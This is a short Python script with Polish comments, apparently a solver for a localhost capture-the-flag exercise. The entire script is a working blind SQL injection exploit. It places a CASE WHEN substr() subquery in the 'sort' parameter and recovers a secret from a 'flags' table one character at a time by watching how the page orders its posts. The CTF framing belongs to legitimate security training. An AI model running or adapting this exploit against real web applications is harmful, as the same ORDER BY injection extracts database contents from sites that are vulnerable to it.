from bs4 import BeautifulSoup
import requests

URL = "http://localhost:8080/"  # zmień na adres serwera z Twoim CTF
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789{}_"
FLAG = ""
MAX_FLAG_LEN = 40

for pos in range(1, MAX_FLAG_LEN + 1):
    found_char = None
    for c in CHARSET:
        payload = (
            f"(SELECT CASE WHEN substr((SELECT flag FROM flags WHERE id = 2 LIMIT 1), {pos}, 1) = '{c}' "
            f"THEN id ELSE title END)"
        )
        params = {"sort": payload}
        try:
            r = requests.get(URL, params=params, timeout=5)
            if r.status_code != 200:
                print(f"Server returned status code {r.status_code}")
                exit(1)
            content = r.text

            soup = BeautifulSoup(content, 'html.parser')
            first_post_title_div = soup.find('div', class_='post-title')
            if first_post_title_div and 'CTF 101: SQLi Basics' in first_post_title_div.text:
                found_char = c
                print(f"Znaleziono znak na pozycji {pos}: {c}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
            exit(1)

    if found_char is None:
        print("Nie znaleziono dalszych znaków, koniec flagi.")
        break
    FLAG += found_char

print(f"Znaleziony flag: {FLAG}")
